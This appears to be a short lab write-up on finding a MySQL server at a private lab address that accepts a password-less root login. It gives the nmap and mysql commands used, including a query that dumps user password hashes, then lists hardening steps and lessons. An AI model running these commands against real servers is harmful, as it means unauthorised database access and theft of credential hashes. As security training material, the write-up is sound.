## Overview
Logged into MySQL as root with no password — zero exploit needed.

## Target
192.168.56.101 port 3306

## Tool
mysql client, nmap

## Commands
```bash
nmap -p 3306 --script mysql-info 192.168.56.101
mysql -u root -h 192.168.56.101 --skip-ssl
show databases;
select user, password from mysql.user;
```

## Findings
Full database access with no authentication. Dumped all 
user hashes from the mysql database.

## Defense
Set root password with mysqladmin. Added bind-address = 
127.0.0.1 in my.cnf to block remote connections.

## What I Learned
Databases should never be internet-facing. A root account 
with no password is an open door to all stored data.
